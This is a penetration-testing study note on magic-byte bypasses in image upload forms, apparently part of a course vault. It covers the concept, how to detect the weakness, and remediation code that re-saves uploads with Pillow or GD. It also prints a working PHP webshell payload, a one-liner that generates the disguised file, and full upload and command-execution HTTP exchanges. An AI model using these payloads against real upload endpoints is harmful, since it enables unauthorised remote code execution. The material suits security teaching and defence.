---
tags: [vapt, file-upload, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.12 Image Upload Magic Bytes Bypass"
portswigger_labs: ["Web shell upload via obfuscated file extension"]
---

# Image Upload Magic Bytes Bypass

## What is it?
Magic bytes are the first few bytes of a file that identify its true type (like a signature), which is more reliable than looking at the file extension. Some applications check these magic bytes using tools like the `file` command or PHP's `finfo_file()` to ensure you are actually uploading an image. A Magic Bytes Bypass occurs when an attacker prepends the magic bytes of an allowed file type (like a JPEG or GIF) to a malicious script (like a PHP webshell). The server checks the first few bytes, thinks it's a valid image, and accepts the file. When accessed, the server's interpreter ignores the image bytes, finds the script tags (e.g., `<?php`), and executes the malicious code.

Think of it like wearing a security guard's uniform over your normal clothes. The server only checks the uniform (magic bytes) at the door, but once inside, the true malicious intent (the PHP code underneath) takes over.

## ASCII Diagram
```text
[Attacker] ---> Uploads file with GIF Magic Bytes + PHP Webshell
                     |
                     v
[Web Server] -> Checks first bytes: "GIF89a" -> "It's an image, let it in!"
                     |
                     v
[Interpreter] -> Ignores "GIF89a", reads <?php ... ?> -> Executes code
                     |
                     v
[Attacker] <--- Server returns command execution output
```

## How to Find It
- **Manual steps:**
  1. Upload a standard PHP webshell (`shell.php`). If it is blocked with an "invalid file type" error, the server might be checking the file content.
  2. Modify the `Content-Type` header to `image/jpeg` or `image/gif`. If it still fails, the server is likely validating magic bytes.
  3. Prepend `GIF89a` to the very beginning of your PHP webshell and try uploading it again.
- **Tool commands:**
  You can use Python to easily generate a file with fake magic bytes:
  ```bash
  python3 -c "with open('shell.gif', 'wb') as f: f.write(b'GIF89a\n<?php system(\$_GET[\"cmd\"]); ?>')"
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Create a PHP webshell with image magic bytes prepended. The easiest is the GIF89a trick because it consists of printable ASCII characters.
  2. Intercept the file upload request in Burp Suite.
  3. Upload the file. Depending on the server's validation, you might need to try different file extensions. Try `shell.php` first. If extensions are restricted, you might need to combine this with an extension bypass (e.g., `shell.php.jpg` or `shell.php%00.jpg`).
  4. Navigate to the uploaded file's URL and execute your commands.

- **Actual payloads:**
  ```php
  GIF89a
  <?php system($_GET['cmd']); ?>
  ```

- **Real HTTP request/response examples:**
  **Request:**
  ```http
  POST /upload HTTP/1.1
  Host: target.com
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

  ------WebKitFormBoundary
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: image/gif

  GIF89a
  <?php system($_GET['cmd']); ?>
  ------WebKitFormBoundary--
  ```
  **Response:**
  ```http
  HTTP/1.1 200 OK
  
  File uploaded successfully to /uploads/shell.php
  ```
  **Execution:**
  ```http
  GET /uploads/shell.php?cmd=id HTTP/1.1
  Host: target.com
  
  HTTP/1.1 200 OK
  GIF89a
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

## Real-World Example
In a real-world penetration test, an application allowed users to upload avatar images. It strictly checked the magic bytes of the file using `finfo_file()` in PHP to ensure it was a valid JPEG or PNG. An attacker used `exiftool` to embed a PHP webshell into the Exif metadata (comment field) of a completely valid, working JPEG file. They then combined this with a local file inclusion (LFI) vulnerability to force the server to parse the avatar image as a PHP file, achieving remote code execution.

## How to Fix It
- **Developer remediation:**
  Validating magic bytes is not enough, as attackers can easily spoof them or append malicious code to valid images. The proper defense is to parse and re-save the image. When an image is re-saved, the image processing library drops any non-image data (like Exif comments or appended PHP code) and generates a clean image file.

- **Code snippet:**
  **Python (using Pillow):**
  ```python
  from PIL import Image
  import io

  def validate_and_clean_image(file_data):
      try:
          # Verify it's a valid image structure
          img = Image.open(io.BytesIO(file_data))
          img.verify()
          
          # Must re-open after verify()
          img = Image.open(io.BytesIO(file_data))
          
          # Re-save to strip any embedded malicious code
          output = io.BytesIO()
          img.save(output, format='JPEG')
          return output.getvalue()
      except Exception:
          raise ValueError("Not a valid image")
  ```

  **PHP (using GD):**
  ```php
  $image = @imagecreatefromjpeg($tmp_path);
  if (!$image) {
      die("Invalid JPEG image");
  }
  // Re-save the image to a new file, stripping any embedded code
  imagejpeg($image, $safe_output_path, 85);
  imagedestroy($image);
  ```

## Chaining Opportunities
- This vuln + [[04 - Extension Bypass (.php5, .phtml, .phar, .shtml)]] → Bypasses both magic bytes and basic extension filters to achieve RCE.
- This vuln + [[Local File Inclusion (LFI)]] → Upload a polyglot image (valid image + PHP code) and use LFI to execute it even if the upload directory doesn't execute `.jpg` files directly.

## Related Notes
- [[02 - Unrestricted File Upload — Webshell Upload]]
- [[03 - Content-Type Bypass]]
- [[04 - Extension Bypass (.php5, .phtml, .phar, .shtml)]]
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]]
